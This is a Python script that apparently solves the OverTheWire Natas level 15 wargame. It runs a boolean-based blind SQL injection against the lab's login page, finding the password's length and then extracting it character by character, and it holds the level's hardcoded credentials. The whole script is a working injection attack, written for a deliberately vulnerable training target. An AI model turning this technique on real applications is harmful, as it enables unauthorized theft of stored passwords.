# -*- coding: utf-8 -*-
"""
Created on Tue Jan 26 18:34:02 2021

@author: ASUS
"""

import requests

leng1='natas16" and (length(password)={0}) --+'
pass1='natas16" and (ord(substr(password ,{0},1))={1});--+'

url = "http://natas15.natas.labs.overthewire.org/index.php?username="
session = requests.Session()
some=requests.get(url,auth=requests.auth.HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')).text
print("Some :",some)
success = requests.get(url+"natas16",auth=requests.auth.HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')).text
print("Success :",success)
number_of_request = 0
leng=0
for i in range(0,100):
    load = leng1.format(i)
    response = requests.get(url+load,auth=requests.auth.HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
    if ("This user exists." in response.text):
        leng = i
        print("Length :",leng)
        break
Length= leng
password=""
for i in range(1,leng+1):
    for j in range(0,128):
        load = pass1.format(i,j)
        response = requests.get(url+load,auth=requests.auth.HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if ("This user exists." in response.text):
            password += chr(j)
            print("Characters found :",i,"Password :",password)
            break;
print("Password :",password)

